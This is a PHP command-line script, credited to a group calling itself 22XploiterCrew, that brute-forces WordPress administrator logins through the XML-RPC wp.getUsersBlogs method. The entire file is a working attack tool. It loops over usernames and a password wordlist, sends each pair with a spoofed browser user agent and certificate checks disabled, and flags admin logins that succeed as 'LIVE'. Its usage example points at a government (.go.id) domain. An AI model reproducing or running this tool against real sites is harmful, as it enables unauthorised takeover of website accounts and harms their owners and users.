#!/usr/bin/env php
<?
/**
* @Author		RandsX
* @Team			22XploiterCrew
* @Desc			WordPress XMLRPC Brute Force
* @License	MIT
* 
* @Usage		php xmlrpc.php -t|--target target.go.id -u|--username user1|user2|user3 -p|--password password.txt -o|--timeout [Timeout in second] <- Optional for arg timeout
*/
ini_set("memory_limit", "256M");
defined("CIN") or define("CIN", getopt('t:u:p:o::', array('target:','username:','password:','timeout::')));

class Xmlrpc extends Cout {
	/**
 	* String
 	* String
 	* Array
 	*/
	private $target, $user, $pass;
	
	public function __construct() {
		# Banner
		parent::__construct();
		
		# Cek target
		if (CIN['t'] ?? CIN['target']) {
				$this->target = CIN['t'] ?? CIN['target'];
			# Cek username
			if (CIN['u'] ?? CIN['user']) {
				$parse = explode(':', CIN['u'] ?? CIN['user']);
				$this->user = array_filter($parse);
				# Cek password
				if(CIN['p'] ?? CIN['password']) {
					if (file_exists(CIN['p'] ?? CIN['password'])) {
						$file = file_get_contents(CIN['p'] ?? CIN['password']);
						$readline = preg_split('/\r\n|\n/', $file);
						$this->pass = array_filter($readline);
					} else {
						$this->error("File ".CIN['p'] ?? CIN['password']." not exists!");
						return;
					}
				} else {
					$this->error("Password is required");
					return;
				}
			} else {
				$this->error("Username is required");
				return;
			}
		} else {
			$this->error("Target is required");
			return;
		}
		
		$this->brute();
	}
	
	private function post($url, $user, $pass){
		$body = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$user</string></value></param><param><value><string>$pass</string></value></param></params></methodCall>"; # Xml Type
		
		$curl = curl_init();
		curl_setopt_array($curl,
		[
			CURLOPT_URL 						=> $url,
			CURLOPT_POST 						=> TRUE,
			CURLOPT_POSTFIELDS 			=> $body,
			CURLOPT_USERAGENT 			=> "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0",
			CURLOPT_TIMEOUT 				=> (CIN['o'] ?? CIN['timeout'] ?? 10),
			CURLOPT_SSL_VERIFYPEER  => FALSE,
			CURLOPT_RETURNTRANSFER 	=> TRUE,
		]);
		$exec = curl_exec($curl);
		if(stristr($exec,"<name>isAdmin</name>")){
			return true;
		} else {
			return false;
		}
	}
	
	protected function brute(){
		foreach ($this->user as $user) {
			foreach ($this->pass as $pass) {
				$login = $this->post($this->target, $user, $pass);
				if($login){
					$this->oklog($user, $pass);
					return;
				} else {
					$this->errlog($user, $pass);
				}
			}
		}
	}
}

# Console out class
class Cout {
	
	# Color
	const color = 
	[
		"White"  => "\e[39m",
		"Green"  => "\e[92m",
		"Yellow" => "\e[93m",
		"Red"    => "\e[31m",
	];
	
	public function __construct(){
		print (PHP_OS == "Linux") ? @exec("clear") : "";
		#print PHP_OS;
		for($i=1;$i<=30;$i++) print '=';
		print self::color["Green"]."\nWordPress Xmlrpc Brute Force\n\n".self::color["White"];
		print self::color["Yellow"];
		print "@Author\tRandsX\n";
		print "@Team\t22XploiterCrew\n";
		print self::color["White"];
		for($i=1;$i<=30;$i++) print '=';
		print "\n\n";
	}
	
	public function error($msg){
		print "[".self::color["Red"]."ERROR".self::color["White"]."] $msg\n";
	}
	
	public function errlog($user, $pass){
		print "[".self::color["Red"]."DIE".self::color["White"]."]\t$user:$pass\n";
	}
	
	public function oklog($user, $pass){
		print "[".self::color["Green"]."LIVE".self::color["White"]."]\t$user:$pass\n\n";
	}
}

$xmlrpc = new Xmlrpc;